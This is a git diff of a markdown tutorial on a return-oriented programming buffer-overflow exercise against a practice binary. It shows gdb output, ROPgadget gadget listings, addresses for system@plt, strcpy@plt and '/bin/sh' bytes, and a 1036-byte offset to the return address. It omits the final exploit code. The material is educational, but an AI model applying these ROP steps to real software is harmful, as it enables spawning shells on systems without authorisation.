@@ -96,7 +96,7 @@ Stack level 0, frame at 0xbffff880:
   eip at 0xbffff87c
  ```
  
- eip at *0xbffff87c*, right so, lets take a look at the Stack: 
+ eip at **0xbffff87c**, right so, lets take a look at the Stack: 
  
 ```
 (gdb) x/10xw $esp
@@ -162,6 +162,7 @@ Here is the output :
 ```
 ROPgadget --binary rop
 
+.....
 0x08048513 : pop ecx ; pop ebx ; leave ; ret
 0x080484f7 : pop edi ; pop ebp ; ret
 0x080484f6 : pop esi ; pop edi ; pop ebp ; ret
@@ -191,7 +192,7 @@ We also need the "/bin/sh" characters in bytes of course in order to craft our s
 ROPgadget again to the rescue 
 
 ```
- ROPgadget --binary Buffer-Overflow-Practise/return-oriented-programming/rop --memstr "/bin/sh"
+ ROPgadget --binary rop --memstr "/bin/sh"
 Memory bytes information
 =======================================================
 0x08048134 : '/'
@@ -202,18 +203,17 @@ Memory bytes information
 0x08048142 : 's'
 0x08048326 : 'h'
 ```
-
  
-To sum it up:
-
+We have what we need,  to sum it up:
 
 - stcrpy@plt 0x08048320 
 - system@plt 0x08048330 
-- .bss (readelf -s Buffer-Overflow-Practise/return-oriented-programming/rop | grep .bss)
+- .bss address (readelf -s rop | grep .bss)
 - pop pop ret gadget 0x080484f7
+- the addresses of "/bin/sh" obtained with ROPgadget
 
 I would include the python code but it gets really boring, you can look it up in the repository, it also contains comments.
-But i will put together the logic of how we should create the exploit.
+But i will put together the logic here of how we could construct the exploit.
 
 ```
 1036 bytes exactly till ret address
